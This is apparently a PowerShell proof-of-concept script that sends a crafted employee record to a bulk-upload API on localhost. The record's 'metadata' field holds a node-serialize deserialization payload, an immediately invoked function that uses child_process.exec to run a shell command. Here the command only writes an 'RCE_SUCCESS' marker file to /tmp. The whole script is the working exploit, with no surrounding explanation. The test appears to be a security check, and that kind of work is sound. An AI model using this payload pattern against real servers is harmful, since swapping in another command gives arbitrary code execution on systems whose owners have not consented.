$payload = @'
[
  {
    "name": "Malicious User",
    "position": "Hacker",
    "department": "Security",
    "email": "hacker@example.com",
    "phone": "555-000-0000",
    "location": "Remote",
    "hire_date": "2023-01-01",
    "status": "active",
    "manager": "None",
    "salary": 0,
    "bio": "This is a test.",
    "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"echo RCE_SUCCESS_$(date) > /tmp/rce_test.txt\\\", function(error, stdout, stderr){});return \\\"\\\";}()\"}"
  }
]
'@

$headers = @{
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-WebRequest -Uri "http://localhost:8080/api/employees/bulk-upload" -Method POST -Body $payload -Headers $headers
    Write-Host "Response Status Code: $($response.StatusCode)"
    Write-Host "Response Content: $($response.Content)"
} catch {
    Write-Host "Error: $_"
    Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)"
    if ($_.Exception.Response) {
        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response Content: $responseBody"
        $reader.Close()
    }
} 